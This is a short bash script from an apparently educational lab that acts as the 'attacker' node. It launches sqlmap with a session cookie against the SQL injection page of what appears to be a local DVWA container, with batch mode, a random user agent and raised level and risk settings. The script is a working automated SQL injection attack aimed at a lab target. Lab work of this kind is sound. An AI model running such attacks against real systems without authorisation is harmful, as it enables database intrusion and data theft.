#!/bin/bash
# attacker-scripts/send_sqlmap.sh
# Menjalankan pengujian otomatis menggunakan SQLMap (sebagai Attacker).

TARGET_IP="172.17.0.2"
TARGET_URL="http://$TARGET_IP/vulnerabilities/sqli/?id=1&Submit=Submit"
COOKIE="PHPSESSID=pnb708okemms8g0a3ejaocb535; security=low"

# Override Cookie dari argumen jika ada
if [ -n "$1" ]; then
    COOKIE="$1"
fi

echo ""
echo "     NODE ATTACKER: SEND SQLMAP ATTACK     "
echo "  Target : $TARGET_URL"
echo "  Cookie : ${COOKIE:0:40}..."
echo ""

# Jalankan SQLMap
# Opsi -v 3 menampilkan payload asli yang sedang dikirim SQLMap ke target
sqlmap -u "$TARGET_URL" \
       --cookie="$COOKIE" \
       --batch \
       --random-agent \
       --dbms=mysql \
       --level=2 \
       --risk=2 \
       -v 3

echo ""
echo "--------------------------------------------------------"
echo "  [OK] sqlmap done bang! :D"
echo "--------------------------------------------------------"
echo ""
